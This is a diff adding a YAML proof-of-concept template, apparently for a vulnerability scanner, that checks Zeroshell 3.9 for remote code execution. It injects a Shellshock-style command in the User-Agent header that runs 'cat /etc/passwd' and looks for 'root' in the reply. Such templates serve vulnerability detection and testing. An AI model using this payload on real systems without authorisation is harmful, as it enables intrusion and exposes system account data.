@@ -1,0 +1,18 @@
+name: zeroshell-3.9-type-rce
+set:
+  s0: randomInt(10000,99999)
+groups:
+  poc:  
+    - method: GET
+      path: /cgi-bin/jarrewrite.sh
+      headers:
+        User-Agent: () { :; }; echo ; /bin/bash -c 'cat /etc/passwd'
+      follow_redirects: false 
+      body:
+      expression: >-
+        response.status == 200 && response.body.bcontains(b'root')
+
+detail: 
+  links: 
+  authors:
+
